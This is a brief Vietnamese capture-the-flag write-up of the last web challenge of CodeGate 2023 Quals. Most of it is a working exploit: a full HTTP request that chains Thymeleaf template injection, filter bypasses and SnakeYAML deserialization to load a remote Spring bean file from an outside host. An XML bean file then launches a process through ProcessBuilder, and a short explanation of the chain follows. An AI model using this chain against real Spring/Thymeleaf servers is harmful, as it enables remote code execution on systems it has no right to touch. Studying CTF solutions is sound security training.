Đây là một bài brief do mình ngồi tham khảo solution và làm lại của bài web cuối cùng trong đợt CodeGate 2023 Quals hồi đầu năm

Request: 
```http
GET /<@urlencode>__|*bla**{"a"+@servletContext.setAttribute("t","".class.forName("org.thymeleaf.TemplateEngine").newInstance())+@servletContext.getAttribute("t").setDialects("".class.forName("org.thymeleaf.spring6.dialect.SpringStandardDialect").newInstance())+@servletContext.getAttribute("t").process(("[["+"*"+"{T"+"(org.yaml.snakeyaml.Yaml).newInstance().load("+"".copyValueOf("a".toCharArray()[0].toChars(39))+thymeleafRequestContext.httpServletRequest.getParameterMap().values()[0][0]+"".copyValueOf("a".toCharArray()[0].toChars(39))+")}"+"]]"),"".class.forName("org.thymeleaf.context.Context").newInstance())+""}|__<@/urlencode>?a=<@urlencode>aaa: !!org.springframework.context.support.FileSystemXmlApplicationContext [ "http://172.23.42.39:8082/exploit.bean" ]<@/urlencode>%0a HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SESSION=MTA5MjljNmEtOGRhMy00YTlhLWI0MmItOTc2ZTc5ZDM5NDZl
Connection: close


```

exploit.bean:
```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <array>
                <value>calc.exe</value>
            </array>
        </constructor-arg>
        <property name="any" value="#{ pb.start() }"/>
    </bean>
</beans>
```

Brief: dùng syntax **Literal Substitution** của Thymeleaf để bypass phần check trong phần preprocess của thymeleaf, từ đó gọi lại `org.thymeleaf.TemplateEngine` 1 lần nữa để parse EL nhằm bypass đoạn check `T(`. Sử dụng class `org.yaml.snakeyaml.Yaml` vì nó không nằm trong blacklist của thymeleaf, lợi dụng cú pháp `Secondary Tag Handle` mà snakeyaml implement để load 1 class tùy ý, load đến class `org.springframework.context.support.FileSystemXmlApplicationContext` để parse một remote xml file nhằm instantiate class `ProcessBuilder` và lợi dụng đặc tính parse SpEL ở state `Populate` của beans để gọi đến method `start` của bean vừa khởi tạo (ở đây là `ProcessBuilder`)
